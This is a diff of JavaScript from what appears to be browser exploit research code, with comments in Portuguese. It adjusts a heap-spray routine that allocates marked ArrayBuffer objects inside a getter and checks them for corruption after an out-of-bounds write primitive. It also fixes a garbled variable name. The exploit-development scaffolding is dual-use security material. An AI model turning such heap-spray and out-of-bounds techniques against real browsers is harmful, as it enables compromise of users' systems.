@@ -31,14 +31,14 @@ class CheckpointForSprayTest {
 
         let details_log = [];
         let sprayed_objects = [];
-        const spray_count = 200; // Aumentar para um spray mais denso
+        const spray_count = 200;
 
         try {
             logS3("DENTRO DO GETTER: Iniciando spray de objetos com ArrayBuffer interno...", "info", FNAME_GETTER);
             for (let i = 0; i < spray_count; i++) {
                 try {
-                    let ab_inner = new ArrayBuffer(32); // AB pequeno
-                    new DataView(ab_inner).setUint32(0, 0x41410000 + i, true); // Padrão + índice
+                    let ab_inner = new ArrayBuffer(32);
+                    new DataView(ab_inner).setUint32(0, 0x41410000 + i, true);
                     sprayed_objects.push({ id: i, inner_ab: ab_inner, marker: 0xBAD0000 + i });
                 } catch (e_alloc) {
                     details_log.push(`Erro ao alocar objeto de spray ${i}: ${e_alloc.message}`);
@@ -49,7 +49,8 @@ class CheckpointForSprayTest {
 
             let corruption_observed_in_spray = false;
             for (let i = 0; i < sprayed_objects.length; i++) {
-                const喷霧_obj = sprayed_objects[i];
+                // const喷霧_obj = sprayed_objects[i]; // <--- LINHA COM ERRO
+                const spray_obj = sprayed_objects[i]; // <--- CORRIGIDO AQUI
                 if (!spray_obj || !spray_obj.inner_ab) continue;
 
                 try {
@@ -104,9 +105,6 @@ class CheckpointForSprayTest {
 export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
     const FNAME_TEST = "executeSprayTestInGetter"; // Nome interno
     logS3(`--- Iniciando Teste de Spray e Verificação no Getter ---`, "test", FNAME_TEST);
-
-    // ... (setup inicial, triggerOOB_primitive, escrita OOB em 0x70, criação de checkpoint_obj) ...
-    // Esta parte é similar às versões anteriores
 
     getter_called_flag = false;
     current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };
